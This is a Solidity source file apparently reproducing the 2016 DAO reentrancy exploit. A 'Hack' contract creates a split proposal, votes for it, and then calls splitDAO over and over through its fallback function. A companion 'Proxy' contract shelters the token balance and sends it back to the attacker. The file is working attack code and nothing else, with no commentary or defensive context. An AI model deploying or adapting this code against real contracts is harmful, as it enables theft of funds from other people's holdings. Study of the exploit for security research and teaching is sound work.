import "DAOInterface.sol";

contract Proxy {
  DAOInterface DAO;
  address owner;

  function Proxy(address _dao) {
    owner = msg.sender;
    DAO = DAOInterface(_dao);
  }

  function empty() {
    if (msg.sender != owner) return;

    uint balance = DAO.balanceOf(this);
    DAO.transfer(owner, balance);
  }
}

contract Hack {
  uint public proposalID;
  DAOInterface public DAO;
  uint public calls_to_make;
  uint public calls;
  Proxy public proxy;

  function Hack(address _dao) {
    DAO = DAOInterface(_dao);
    calls = 0;
    proxy = new Proxy(_dao);
    calls_to_make = 1;
  }

  function makeSplitProposal() {
    // 0x4c6f6e656c792c20736f204c6f6e656c79 == "Lonely, so Lonely"
    // 0x93a80 == 604800 == 1 week in seconds
    bytes memory transactionData;
    proposalID = DAO.newProposal(this, 0x0, "Lonely, so Lonely", transactionData, 0x93a80, true);
  }

  function voteYesOnProposal() {
    DAO.vote(proposalID, true);
  }

  function fillProxy() {
    uint balance = DAO.balanceOf(this);
    DAO.transfer(address(proxy), balance);
  }

  function splitDAO() {
    calls += 1;
    DAO.splitDAO(proposalID, this);
  }

  function runHack(uint _calls_to_make) {
    calls = 0;
    calls_to_make = _calls_to_make;
    proxy.empty();
    splitDAO();
  }

  function() {
    if (calls < calls_to_make) {
      splitDAO();
    } else {
      fillProxy();
    }
  }
}
